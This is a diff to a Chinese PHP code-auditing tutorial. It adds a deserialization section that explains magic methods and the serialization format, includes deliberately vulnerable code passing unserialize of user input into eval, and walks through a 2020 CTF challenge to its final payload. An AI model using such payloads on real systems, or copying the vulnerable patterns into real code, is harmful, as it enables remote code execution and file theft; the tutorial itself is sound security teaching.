@@ -218,6 +218,320 @@ popen和proc\_open函数不会直接返回执行结果，会返回一个文件�
 
 漏洞防范措施有：一种是使用PHP自带的命令防注入函数，包括escapeshellcmd\(\),和escapeshellarg，其中第一个函数是过滤整条命令，所以他的参数是一整条命令，第二个函数是用来保证传入命令执行函数里面的参数确实是以字符串参数形式存在的
 
+### 7、反序列化
+
+**魔术方法**
+
+在审计`php反序列化`漏洞的时候需要着重注意几个典型的魔术方法：
+
+| 函数 | 简介 |
+| :--- | :--- |
+| `__sleep` | `serialize()`函数在执行时会检查是否存在一个`__sleep`魔术方法，如果存在，则先被调用 |
+| `__wakeup` | `unserialize()`函数执行时会检查是否存在一个`__wakeup` 方法，如果存在，则先被调用 |
+| `__construct` | 构造函数会在每次创建新对象时先调用 |
+| `__destruct` | 析构函数是`php5`新添加的内容，析构函数会在到对象的所有引用都被删除或者当对象被显式销毁时执行 |
+| `__toString` | 当对象被当做字符串的时候会自动调用该函数 |
+
+```text
+<?php
+class Student{
+    public $name = 'zjun';
+    public $age = '19';
+
+    public function PrintVar(){
+        echo 'name '.$this -> name . ', age ' . $this -> age . '<br>';
+    }
+    public function __construct(){
+        echo "__construct<br>";
+    }
+    public function __destory(){
+        echo "__destory<br>";
+    }
+    public function __toString(){
+        return "__toString";
+    }
+    public function __sleep(){
+        echo "__sleep<br>";
+        return array('name', 'age');
+    }
+    public function __wakeup(){
+        echo "__wakeup<br>";
+    }
+}
+
+$obj = new Student();
+$obj -> age = 18;
+$obj -> name = 'reder';
+$obj -> PrintVar();
+echo $obj;
+$s_serialize = serialize($obj);
+echo $s_serialize.'<br>';
+$unseri = unserialize($s_serialize);
+$unseri -> PrintVar();
+?>
+```
+
+输出结果：
+
+```text
+__construct
+name reder, age 18
+__toString__sleep
+O:7:"Student":2:{s:4:"name";s:5:"reder";s:3:"age";i:18;}
+__wakeup
+name reder, age 18
+```
+
+在进行构造反序列化`payload`时，可跟进以上几个比较典型的魔术变量进行深入挖掘。
+
+**一个例子**
+
+在`php`中，序列化和反序列化一般用做应用缓存，比如`session`缓存，`cookie`等，或者是格式化数据存储，例如`json`，`xml`等。
+
+一个很简单的序列化代码，如下：
+
+```text
+<?php
+    class Student{
+        public $name = 'zjun';
+
+        function GetName(){
+            return 'zjun';
+        }
+    }
+    $s = new Student();
+    echo $s->GetName().'<br>';
+    $s_serialize = serialize($s);
+    echo $s_serialize;
+```
+
+一个`Student`类，其中有一个`name`属性和一个`GetName`方法，然后实例化了`Student`类的对象，输出调用`GetName`这个类方法，然后`serialize()`函数把对象转成字符串，也就是序列化，再输出序列化后的内容
+
+输出结果：
+
+```text
+zjun
+O:7:"Student":1:{s:4:"name";s:4:"zjun";}
+```
+
+序列化的数据详解：
+
+`O`是`object`表示对象，`:`后边的内容为这个对象的属性，`7`表示对象名称的长度，`Student`就是对象名，`1`表示对象有一个成员变量，就是`{}`里面的东西，`s`表示这个成员变量是一个`str`字符串，他的长度为`4`，后面跟着成员变量名，以及这个成员变量的数据类型，长度，内容。
+
+这里代码只有一个`public`属性，如果有`protected`或者`private`属性，在序列化的数据中也都会体现出来
+
+```text
+<?php
+    class Student{
+        public $name = 'zjun';
+        protected $age = '19';
+        private $weight = '53';
+
+        function GetName(){
+            return 'zjun';
+        }
+    }
+    $s = new Student();
+    echo $s->GetName().'<br>';
+    $s_serialize = serialize($s);
+    echo $s_serialize;
+```
+
+输出：
+
+```text
+zjun
+O:7:"Student":3:{s:4:"name";s:4:"zjun";s:6:"*age";s:2:"19";s:15:"Studentweight";s:2:"53";}
+```
+
+可见`public`类型直接是变量名，`protected`类型有`*`号，但是其长度为`6`，是因为`\x00+*+\x00+变量名`。同理`private`类型会带上对象名，其长度是`15`，`\x00+类名+\x00+变量名`。
+
+以上的这个过程就称为`php序列化`，再看看反序列化：
+
+```text
+<?php
+    class Student{
+        public $name = 'zjun';
+
+        function GetName(){
+            return 'zjun';
+        }
+    }
+
+    $Student = 'O:7:"Student":1:{s:4:"name";s:4:"zjun";}';
+    $s_unserialize = unserialize($Student);
+    print_r($s_unserialize);
+?>
+```
+
+`unserialize()`函数就是用来反序列化的函数，输出：
+
+```text
+Student Object ( [name] => zjun )
+```
+
+一个`Student`对象，其中`name`成员变量等于`zjun`，这就是反序列化，将格式化字符串转化为对象。
+
+在这个过程中本来是挺正常的，在一些特殊情景下却能造成如`rce`等漏洞，如
+
+```text
+<?php
+class Student{
+    var $a;
+    function __construct() {
+        echo '__construct';
+    }
+    function __destruct() {
+        $this->a->action();
+        echo 'one';
+    }
+}
+
+class one {
+    var $b;
+    function action() {
+        eval($this->b);
+    }
+}
+$c = new Student();
+unserialize($_GET['a']);
+?>
+```
+
+代码有一个构造函数`__construct`输出`__construct`，在`new`这个对象时自动调用，一个析构函数`__destruct`将当我们传入的`a`再传进`one`对象中执行，构造代码：
+
+```text
+<?php
+class Student {
+    var $a;
+    function __construct() {
+        $this->a = new one();
+    }
+}
+class one {
+    var $b = "phpinfo();";
+}
+echo serialize(new Student());
+?>
+```
+
+输出：
+
+```text
+O:7:"Student":1:{s:1:"a";O:3:"one":1:{s:1:"b";s:10:"phpinfo();";}}
+```
+
+![](https://xzfile.aliyuncs.com/media/upload/picture/20200809201524-00e203b4-da3a-1.png)
+
+成功触发。
+
+**实例：网鼎杯 2020 青龙组 AreUSerialz**
+
+```text
+<?php
+include("flag.php");
+highlight_file(__FILE__);
+
+class FileHandler {
+    protected $op;
+    protected $filename;
+    protected $content;
+
+    function __construct() {
+        $op = "1";
+        $filename = "/tmp/tmpfile";
+        $content = "Hello World!";
+        $this->process();
+    }
+
+    public function process() {
+        if($this->op == "1") {
+            $this->write();
+        } else if($this->op == "2") {
+            $res = $this->read();
+            $this->output($res);
+        } else {
+            $this->output("Bad Hacker!");
+        }
+    }
+
+    private function write() {
+        if(isset($this->filename) && isset($this->content)) {
+            if(strlen((string)$this->content) > 100) {
+                $this->output("Too long!");
+                die();
+            }
+            $res = file_put_contents($this->filename, $this->content);
+            if($res) $this->output("Successful!");
+            else $this->output("Failed!");
+        } else {
+            $this->output("Failed!");
+        }
+    }
+
+    private function read() {
+        $res = "";
+        if(isset($this->filename)) {
+            $res = file_get_contents($this->filename);
+        }
+        return $res;
+    }
+
+    private function output($s) {
+        echo "[Result]: <br>";
+        echo $s;
+    }
+
+    function __destruct() {
+        if($this->op === "2")
+            $this->op = "1";
+        $this->content = "";
+        $this->process();
+    }
+}
+
+function is_valid($s) {
+    for($i = 0; $i < strlen($s); $i++)
+        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
+            return false;
+    return true;
+}
+
+if(isset($_GET{'str'})) {
+    $str = (string)$_GET['str'];
+    if(is_valid($str)) {
+        $obj = unserialize($str);
+    }
+}
+```
+
+这里需要读`flag.php`文件，在`process()`函数中，当`op=2`时，`read()`中的`file_get_contents`就会执行，`is_valid()`会判断传入的字符串是否为可打印字符，而原来的类修饰均为`protected`，在序列化时会生成不可见的`\x00`，但`php7+`对类的属性类型不敏感，可直接把属性修饰为`public`，成功绕过`is_valid()`。
+
+构造
+
+```text
+<?php
+class FileHandler {
+
+    public $op = 2;
+    public $filename = "flag.php";
+    public $content;
+}
+
+$a = new FileHandler();
+echo serialize($a)."\n";
+```
+
+传入
+
+```text
+?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;}
+```
+
+![](https://xzfile.aliyuncs.com/media/upload/picture/20200809201527-027c635e-da3a-1.png)
+
+
+
 ## 二、PHP代码审计深入
 
 ### 1、变量覆盖
@@ -342,7 +656,7 @@ asp标签&lt;%...%&gt;在PHP3.0.4之后可用，需要在php.ini中设置asp\_ta
 
 ### 7、十种MySQL报错注入
 
-很久以前就有的数据类型转换错误就是用的最多的一种方式，这种方式大多用在SQL SERVER上面，利用的是convert,cast函数，MYSQL的报错SQL注入方式更多，不过大多数人只认识三种，floor，updatexml,extractvalue这三种，但实际上还有许多的方式会导致这种漏洞。他们分别是： GeometryCollection,polygon,GTID\_SUBSET,multipoint,multilinestring,multipolygon,LINESTRING,exp; 
+很久以前就有的数据类型转换错误就是用的最多的一种方式，这种方式大多用在SQL SERVER上面，利用的是convert,cast函数，MYSQL的报错SQL注入方式更多，不过大多数人只认识三种，floor，updatexml,extractvalue这三种，但实际上还有许多的方式会导致这种漏洞。他们分别是： `GeometryCollection`,`polygon`,`GTID_SUBSET`,`multipoint`,`multilinestring`,`multipolygon`,`LINESTRING`,`exp`; 
 
 通常的漏洞利用语句是`select * from phpsec where id=?`
 
@@ -400,20 +714,20 @@ echo $seay
 
 ### 3、业务功能安全设计
 
-1.验证码：可能存在的安全问题有：不刷新直接跳过，暴力破解，机器识别，打码平台；验证码资源滥用：短信轰炸机就是利用了网站的短信验证码接口，   
-2.用户登录：撞库漏洞：用户名和密码错误次数没有限制，但时间段内用户的密码错误次数限制；单时间段内IP登录错误次数限制；API登录：利用第三方平台进行登录，应该注意登录秘钥需要不可预测并且不固定，生成key算法中加入随机字符，API接口禁止搜索引擎收录，登录秘钥当次绑定当前主机，换机器不可用，防止QQ木马和嗅探KEY   
-3.用户注册：应该设计验证码，采集用户机器唯一识别码，拦截短时间内多次注册，根据账号格式自学习识别垃圾账号，防止SQL注入漏洞与XSS漏洞   
-4.密码找回：应该注意一下三个大流程：输入用户名/邮箱/手机号的阶段；填写验证码和新密码的阶段（可能存在验证凭证较简单，可以被暴力破解；验证凭证算法简单，凭证可以预测；验证凭证直接保存在源码里）；发送新密码阶段   
-5.资料查看与修改：未验证用户权限，未验证当前登录用户，   
-6.投票/积分/抽奖：cookie或者POST请求正文绕过，基于IP验证，基于用户认证   
-7.充值支付：保证数据可信，购买数量不能小于等于0，账户支付锁定机制   
-8.私信以及反馈：最常见的是XSS漏洞以及越权漏洞，还有少部分SQL注入或者命令执行漏洞   
-9.远程地址访问：wordpress,phpcmsd等众多应用都有访问远程地址获取资源的功能，这个功能产生的漏洞叫做SSRF   
-10.文件管理：可能会被黑客利用上传webshell等攻击脚本，应该注意：禁止写入脚本可在服务器端执行的文件，限制文件管理功能操作的目录，限制文件管理功能访问的权限，禁止上传特殊字符文件名的文件   
-11.数据库管理：限制可以操作的数据库，限制备份到服务器上的文件名   
-12.命令/代码执行：严格控制该功能的访问权限，在满足业务需求的情况下，可以设置白名单机制，可以使用escapeshellcmd以及escapeshellsrg函数进行过滤，命令直接写死在代码里更好，给命令以及代码执行功能设置独立密码，代码执行功能限制脚本课=可以访问的路径，在满足需求的情况下限制当前执行命令的系统用户权限   
-13.文件/数据库备份：未授权访问以及越权访问，备份文件名不可预测，生成 的文件可利用web中间件解析漏洞执行代码   
-14.API:设计时应该注意以下几点：访问权限控制，防止敏感信息泄露，SQL注入等常规漏洞
+1. 验证码：可能存在的安全问题有：不刷新直接跳过，暴力破解，机器识别，打码平台；验证码资源滥用：短信轰炸机就是利用了网站的短信验证码接口， 
+2. 用户登录：撞库漏洞：用户名和密码错误次数没有限制，但时间段内用户的密码错误次数限制；单时间段内IP登录错误次数限制；API登录：利用第三方平台进行登录，应该注意登录秘钥需要不可预测并且不固定，生成key算法中加入随机字符，API接口禁止搜索引擎收录，登录秘钥当次绑定当前主机，换机器不可用，防止QQ木马和嗅探KEY 
+3. 用户注册：应该设计验证码，采集用户机器唯一识别码，拦截短时间内多次注册，根据账号格式自学习识别垃圾账号，防止SQL注入漏洞与XSS漏洞 
+4. 密码找回：应该注意一下三个大流程：输入用户名/邮箱/手机号的阶段；填写验证码和新密码的阶段（可能存在验证凭证较简单，可以被暴力破解；验证凭证算法简单，凭证可以预测；验证凭证直接保存在源码里）；发送新密码阶段 
+5. 资料查看与修改：未验证用户权限，未验证当前登录用户， 
+6. 投票/积分/抽奖：cookie或者POST请求正文绕过，基于IP验证，基于用户认证 
+7. 充值支付：保证数据可信，购买数量不能小于等于0，账户支付锁定机制 
+8. 私信以及反馈：最常见的是XSS漏洞以及越权漏洞，还有少部分SQL注入或者命令执行漏洞 
+9. 远程地址访问：wordpress,phpcmsd等众多应用都有访问远程地址获取资源的功能，这个功能产生的漏洞叫做SSRF 
+10. 文件管理：可能会被黑客利用上传webshell等攻击脚本，应该注意：禁止写入脚本可在服务器端执行的文件，限制文件管理功能操作的目录，限制文件管理功能访问的权限，禁止上传特殊字符文件名的文件 
+11. 数据库管理：限制可以操作的数据库，限制备份到服务器上的文件名 
+12. 命令/代码执行：严格控制该功能的访问权限，在满足业务需求的情况下，可以设置白名单机制，可以使用escapeshellcmd以及escapeshellsrg函数进行过滤，命令直接写死在代码里更好，给命令以及代码执行功能设置独立密码，代码执行功能限制脚本课=可以访问的路径，在满足需求的情况下限制当前执行命令的系统用户权限 
+13. 文件/数据库备份：未授权访问以及越权访问，备份文件名不可预测，生成 的文件可利用web中间件解析漏洞执行代码 
+14. API:设计时应该注意以下几点：访问权限控制，防止敏感信息泄露，SQL注入等常规漏洞
 
 ## 五、应用安全体系建设
 
